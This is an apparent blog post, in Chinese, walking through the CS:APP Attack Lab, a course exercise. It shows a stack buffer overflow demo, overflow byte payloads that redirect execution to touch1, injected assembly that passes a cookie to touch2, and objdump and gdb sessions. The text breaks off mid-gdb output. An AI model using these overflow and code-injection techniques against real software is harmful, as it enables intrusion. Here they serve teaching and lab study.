<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Attack Lab该任务涉及对两个具有不同安全漏洞的程序总共发起五次攻击，您将从本实验室获得的成果包括：  您将了解攻击者在程序不存在漏洞时利用安全漏洞的不同方式充分保护自己，防止缓冲区溢出 通过本课程，您将更好地了解如何编写更安全的程序，如以及编译器和操作系统提供的一些功能，以提高程序的安全性 您将更深入地了解 x86-64 的堆栈和参数传递机制机器代码 您将更深入地了解 x86-64 指令的">
<meta property="og:type" content="article">
<meta property="og:title" content="CSapp-Attack Lab">
<meta property="og:url" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="Attack Lab该任务涉及对两个具有不同安全漏洞的程序总共发起五次攻击，您将从本实验室获得的成果包括：  您将了解攻击者在程序不存在漏洞时利用安全漏洞的不同方式充分保护自己，防止缓冲区溢出 通过本课程，您将更好地了解如何编写更安全的程序，如以及编译器和操作系统提供的一些功能，以提高程序的安全性 您将更深入地了解 x86-64 的堆栈和参数传递机制机器代码 您将更深入地了解 x86-64 指令的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/1645606787459.png">
<meta property="og:image" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/1645606908018.png">
<meta property="og:image" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/1645608062313.png">
<meta property="og:image" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/1645610038824.png">
<meta property="og:image" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/1645610107523.png">
<meta property="article:published_time" content="2022-02-23T14:46:32.000Z">
<meta property="article:modified_time" content="2022-10-09T16:08:36.669Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="labs">
<meta property="article:tag" content="CSapp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/02/23/CSapp-Attack%20Lab/1645606787459.png">

<link rel="canonical" href="http://example.com/2022/02/23/CSapp-Attack%20Lab/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>CSapp-Attack Lab | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/CSapp-Attack%20Lab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CSapp-Attack Lab
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-02-23 22:46:32" itemprop="dateCreated datePublished" datetime="2022-02-23T22:46:32+08:00">2022-02-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:36" itemprop="dateModified" datetime="2022-10-10T00:08:36+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h2><p>该任务涉及对两个具有不同安全漏洞的程序总共发起五次攻击，您将从本实验室获得的成果包括：</p>
<ul>
<li>您将了解攻击者在程序不存在漏洞时利用安全漏洞的不同方式充分保护自己，防止缓冲区溢出</li>
<li>通过本课程，您将更好地了解如何编写更安全的程序，如以及编译器和操作系统提供的一些功能，以提高程序的安全性</li>
<li>您将更深入地了解 x86-64 的堆栈和参数传递机制机器代码</li>
<li>您将更深入地了解 x86-64 指令的编码方式</li>
<li>您将获得更多使用 GDB 和 OBJDUMP 等调试工具的经验</li>
</ul>
<h2 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h2><p><strong>实验文件介绍：</strong></p>
<ul>
<li>ctarget：易受 <strong>代码注入</strong> 攻击的可执行程序</li>
<li>rtarget：易受 <strong>面向返回</strong> 编程攻击的可执行程序</li>
<li>cookie.txt：一个8位十六进制代码，在攻击中用作唯一标识符</li>
<li>farm.c：目标公司的“gadget farm”的源代码，用于生成ROP链</li>
<li>hex2raw：一个生成攻击字符串的工具，将16进制数转化为攻击字符，因为有些字符在屏幕上面无法输入，所以输入该字符的16进制数，自动转化为该字符 </li>
</ul>
<p><strong>实验要求：</strong></p>
<ul>
<li>你必须在与目标的机器相似的机器上完成任务</li>
<li>您的解决方案可能不会使用攻击绕过程序中的验证代码，明确地任何包含在攻击字符串中供ret指令使用的地址都应该是以下目的地：<ul>
<li>函数 touch1，touch2 或 touch3 的地址</li>
<li>注入代码的地址</li>
<li>gadget farm 中一个 gadget 的地址</li>
</ul>
</li>
<li>您只能从文件 rtarget 构建 gadget，其地址介于函数 start_farm 和 end_farm 的地址之间</li>
</ul>
<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>C语言对于数组引用不进行任何的边界检查，并且局部变量和状态信息都保存在栈中，对越界的数组元素进行写操作，会破坏存储在栈中的状态信息（覆盖 ret 原本应该执行的返回地址），当寄存器执行 ret 指令时就会出现严重的错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">explosion</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;!!!You touch the explosion&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Implementation of library function gets() */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">custom_gets</span><span class="params">(<span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span> *dest = s;</span><br><span class="line">    <span class="keyword">while</span>((c = getchar()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF)</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    <span class="keyword">if</span>(c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="comment">/* No characters read */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">/* Terminate string */</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Read input line and write it back */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    custom_gets(buf);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    echo();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下命令可以从c源文件生成汇编代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; gcc -fno-asynchronous-unwind-tables -fno-<span class="built_in">stack</span>-protector -O1 -S test.c</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-fno-asynchronous-unwind-tables</code> 选项是用来不生成CFI指令</li>
<li><code>-fno-stack-protector</code> 选项阻止进行栈破坏检测，默认是允许使用栈保护</li>
<li><code>-O1</code> 不做任何优化处理</li>
<li><code>-S</code> 生成汇编代码即结束</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">echo:</span><br><span class="line">	endbr64 </span><br><span class="line">	pushq	%rbx</span><br><span class="line">	subq	$<span class="number">16</span>, %rsp <span class="comment">// 该程序在栈上为字符数组分配了16个字节</span></span><br><span class="line">	leaq	<span class="number">8</span>(%rsp), %rbx <span class="comment">// 数组首地址被装入rbx中</span></span><br><span class="line">	movq	%rbx, %rdi <span class="comment">// 数组首地址被装入rdi中(第一个参数的位置)</span></span><br><span class="line">	call	custom_gets </span><br><span class="line">	movq	%rbx, %rdi <span class="comment">// 数组首地址被装入rdi中(第一个参数的位置)</span></span><br><span class="line">	call	<span class="built_in">puts</span>@PLT</span><br><span class="line">	addq	$<span class="number">16</span>, %rsp <span class="comment">// 回收栈空间</span></span><br><span class="line">	popq	%rbx</span><br><span class="line">	ret</span><br><span class="line">	.size	echo, .-echo</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br></pre></td></tr></table></figure>
<p>使用如下命令可以从c源文件生成二进制代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; gcc -fno-<span class="built_in">stack</span>-protector -g test.c -o test</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-g</code> 方便GDB调试</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp       <span class="number">0x7fffffffdd50</span> —▸ <span class="number">0x7ffff7fb3fc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax rdx<span class="number">-5</span> <span class="number">0x7fffffffdd58</span> ◂— <span class="number">0x550061616161</span> <span class="comment">/* &#x27;aaaa&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbp       <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd80</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│           <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x55555555527b</span> (main+<span class="number">29</span>) ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│           <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x7fffffffde78</span> —▸ <span class="number">0x7fffffffe1de</span> ◂— <span class="number">0x77792f656d6f682f</span> (<span class="string">&#x27;/home/yw&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>发现返回地址很容易覆盖</p>
<h2 id="代码注入攻击"><a href="#代码注入攻击" class="headerlink" title="代码注入攻击"></a>代码注入攻击</h2><p><strong>touch1</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ctarget: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.24</span>, BuildID[sha1]=c7b4ed7d7d986fd5b8ec8742e9c6da371ba6a504, with debug_info, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/attacklab-target1/ctarget&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ./ctarget -q  </span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:</span><br></pre></td></tr></table></figure>
<img src="/2022/02/23/CSapp-Attack%20Lab/1645606787459.png" class width="1645606787459"> 
<p>跟踪字符串定位到第一个输入：</p>
<img src="/2022/02/23/CSapp-Attack%20Lab/1645606908018.png" class width="1645606908018"> 
<p>对输入函数进行反汇编：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004017</span>A8 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004017</span>A8                 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004017</span>AC                 mov     rdi, rsp        ; dest</span><br><span class="line">.text:<span class="number">00000000004017</span>AF                 call    Gets</span><br><span class="line">.text:<span class="number">00000000004017B</span>4                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004017B</span>9                 add     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004017B</span>D                 retn</span><br><span class="line">.text:<span class="number">00000000004017B</span>D ; &#125; <span class="comment">// starts at 4017A8</span></span><br></pre></td></tr></table></figure>
<p>通过“ sub     rsp, 28h ”可以发现：它为数组“buf”提供了“0x28”字节的空间</p>
<p>反编译“touch1”以获取它的地址：（ 0x00000000004017C0 ）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004017</span>C0 ; <span class="function"><span class="keyword">void</span> __cdecl <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:00000000004017C0                 <span class="keyword">public</span> touch1</span></span><br><span class="line"><span class="function">.text:00000000004017C0 touch1          proc near</span></span><br><span class="line"><span class="function">.text:00000000004017C0 </span>; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004017</span>C0                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004017</span>C4                 mov     cs:vlevel, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004017</span>CE                 mov     edi, offset aTouch1YouCalle ; <span class="string">&quot;Touch1!: You called touch1()&quot;</span></span><br><span class="line">.text:<span class="number">00000000004017</span>D3                 call    _puts</span><br><span class="line">.text:<span class="number">00000000004017</span>D8                 mov     edi, <span class="number">1</span>          ; level</span><br><span class="line">.text:<span class="number">00000000004017</span>DD                 call    validate</span><br><span class="line">.text:<span class="number">00000000004017E2</span>                 mov     edi, <span class="number">0</span>          ; status</span><br><span class="line">.text:<span class="number">00000000004017E7</span>                 call    _exit</span><br><span class="line">.text:<span class="number">00000000004017E7</span> ; &#125; <span class="comment">// starts at 4017C0</span></span><br><span class="line">.text:<span class="number">00000000004017E7</span> touch1          endp</span><br></pre></td></tr></table></figure>
<p>写payload调用“touch1”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// 先填充0x28字节的&quot;\x00&quot;</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// 小端序的&quot;0x00000000004017C0&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ./hex2raw -i solutions/level1.txt | ./ctarget -q </span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch1!: <span class="function">You called <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span></span><br><span class="line"><span class="function">PASS: Would have posted the following:</span></span><br><span class="line"><span class="function">	user id	bovik</span></span><br><span class="line"><span class="function">	course	15213-f15</span></span><br><span class="line"><span class="function">	lab	attacklab</span></span><br><span class="line"><span class="function">	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span></span><br></pre></td></tr></table></figure>
<p><strong>touch2</strong></p>
<p>反汇编获取 touch2 的地址为：0x00000000004017EC</p>
<p>故技重施：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1] ./hex2raw -i solutions/level2.txt | ./ctarget -q </span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Misfire: <span class="function">You called <span class="title">touch2</span><span class="params">(<span class="number">0xee55f980</span>)</span></span></span><br><span class="line"><span class="function">FAIL: Would have posted the following:</span></span><br><span class="line"><span class="function">	user id	bovik</span></span><br><span class="line"><span class="function">	course	15213-f15</span></span><br><span class="line"><span class="function">	lab	attacklab</span></span><br><span class="line"><span class="function">	result	1:FAIL:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span></span><br></pre></td></tr></table></figure>
<p>发现不通过，只好先看看 touch2 代码了：</p>
<img src="/2022/02/23/CSapp-Attack%20Lab/1645608062313.png" class width="1645608062313"> 
<p>这段程序就是验证传进来的参数<code>val</code>是否和<code>cookie</code>中值相等（实验给出的cookie为：0x59b997fa）</p>
<p>这时候就好注入代码了：（接下来的调试请用原本GDB）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** inject.s */</span></span><br><span class="line">movq    $<span class="number">0x59b997fa</span>, %rdi</span><br><span class="line">pushq   <span class="number">0x4017ec</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/attacklab-target1/solutions] gcc -c inject.s</span><br><span class="line">➜  [/home/ywhkkx/attacklab-target1/solutions] objdump -d inject.o</span><br><span class="line"></span><br><span class="line">inject.o：     文件格式 elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> 	mov    $<span class="number">0x59b997fa</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	ff <span class="number">34</span> <span class="number">25</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> 	pushq  <span class="number">0x4017ec</span></span><br><span class="line">   e:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>思路很简单，执行这串代码，就可以把cookie赋值给第一个参数，利用程序原本的 ret 可以控制 IP 到 rsp ，代码会把 touch2 的地址压栈并用 ret 执行</p>
<p>接下来用GDB获取执行这串代码时，rsp 的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="keyword">break</span> getbuf <span class="comment">// 打断点</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x4017a8</span>: file buf.c, line <span class="number">12.</span></span><br><span class="line">(gdb) run -q <span class="comment">// 不加&quot;-q&quot;可能会报错</span></span><br><span class="line">Starting program: /home/ywhkkx/attacklab-target1/ctarget -q</span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, getbuf () at buf.c:<span class="number">12</span></span><br><span class="line"><span class="number">12</span>	buf.c: 没有那个文件或目录.</span><br><span class="line">(gdb) disas <span class="comment">// 反汇编</span></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function getbuf:</span><br><span class="line">=&gt; <span class="number">0x00000000004017a8</span> &lt;+<span class="number">0</span>&gt;:	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">   <span class="number">0x00000000004017ac</span> &lt;+<span class="number">4</span>&gt;:	mov    %rsp,%rdi</span><br><span class="line">   <span class="number">0x00000000004017af</span> &lt;+<span class="number">7</span>&gt;:	callq  <span class="number">0x401a40</span> &lt;Gets&gt;</span><br><span class="line">   <span class="number">0x00000000004017b4</span> &lt;+<span class="number">12</span>&gt;:	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">   <span class="number">0x00000000004017b9</span> &lt;+<span class="number">17</span>&gt;:	add    $<span 